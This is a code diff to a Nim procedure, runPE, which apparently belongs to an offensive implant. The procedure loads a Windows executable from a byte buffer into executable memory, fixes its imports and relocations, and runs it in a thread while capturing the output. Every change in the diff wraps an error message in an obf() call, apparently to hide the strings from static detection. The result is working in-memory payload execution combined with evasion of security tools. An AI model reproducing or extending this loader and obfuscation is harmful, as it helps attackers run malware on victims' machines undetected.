@@ -378,13 +378,13 @@ proc runPE*(peBytes: seq[byte]; exeArgs: string = ""; fullTls: bool = false): st
     debug "[DEBUG] runPE called with exeArgs: '" & exeArgs & "' (len: " & $exeArgs.len & ")"
     
     if peBytes.len == 0:
-      return "Error: PE bytes are empty"
+      return obf("Error: PE bytes are empty")
     
     var shellcodePtr = cast[ptr BYTE](unsafeAddr peBytes[0])
     let ntHeader = cast[ptr IMAGE_NT_HEADERS](getNtHdrs(shellcodePtr))
     
     if ntHeader == nil:
-      return "Error: File isn't a valid PE file"
+      return obf("Error: File isn't a valid PE file")
     
     debug "[+] Exe File Prefer Image Base"
     debug "Size: " & $ntHeader.OptionalHeader.SizeOfImage
@@ -400,7 +400,7 @@ proc runPE*(peBytes: seq[byte]; exeArgs: string = ""; fullTls: bool = false): st
     ))
     
     if pImageBase == nil and relocDir == nil:
-      return "Error: Failed to allocate image base at preferred address and no relocations available"
+      return obf("Error: Failed to allocate image base at preferred address and no relocations available")
     
     if pImageBase == nil and relocDir != nil:
       debug "[+] Try to Allocate Memory for New Image Base"
@@ -411,7 +411,7 @@ proc runPE*(peBytes: seq[byte]; exeArgs: string = ""; fullTls: bool = false): st
         PAGE_EXECUTE_READWRITE
       ))
       if pImageBase == nil:
-        return "Error: Failed to allocate memory for image base"
+        return obf("Error: Failed to allocate memory for image base")
     
     # Update image base
     when defined(amd64):
@@ -433,7 +433,7 @@ proc runPE*(peBytes: seq[byte]; exeArgs: string = ""; fullTls: bool = false): st
     
     # Fix IAT
     if not fixIAT(pImageBase, exeArgs):
-      return "Error: Failed to fix Import Address Table"
+      return obf("Error: Failed to fix Import Address Table")
     
     # Handle TLS callbacks
     let tlsDir = getPeDir(pImageBase, IMAGE_DIRECTORY_ENTRY_TLS)
@@ -453,10 +453,10 @@ proc runPE*(peBytes: seq[byte]; exeArgs: string = ""; fullTls: bool = false): st
     if pImageBase != preferAddr:
       when defined(amd64):
         if not applyReloc(cast[ULONGLONG](pImageBase), cast[ULONGLONG](preferAddr), pImageBase, ntHeader.OptionalHeader.SizeOfImage):
-          return "Error: Failed to apply relocations"
+          return obf("Error: Failed to apply relocations")
       else:
         if not applyReloc(cast[ULONGLONG](cast[DWORD](pImageBase)), cast[ULONGLONG](cast[DWORD](preferAddr)), pImageBase, ntHeader.OptionalHeader.SizeOfImage):
-          return "Error: Failed to apply relocations"
+          return obf("Error: Failed to apply relocations")
       debug "[+] Relocation Fixed."
     
     debug "Run Exe Module:"
@@ -494,7 +494,7 @@ proc runPE*(peBytes: seq[byte]; exeArgs: string = ""; fullTls: bool = false): st
       CloseHandle(stdoutWrite)
       CloseHandle(stderrRead)
       CloseHandle(stderrWrite)
-      return "Error: Failed to create execution thread"
+      return obf("Error: Failed to create execution thread")
     
     # Wait for PE to complete
     WaitForSingleObject(thread, INFINITE)
@@ -536,7 +536,7 @@ proc runPE*(peBytes: seq[byte]; exeArgs: string = ""; fullTls: bool = false): st
     if capturedOutput.len > 0:
       return capturedOutput
     else:
-      return "PE executed successfully (no output captured)"
+      return obf("PE executed successfully (no output captured)")
   
   except Exception as e:
     return "Error: " & e.msg
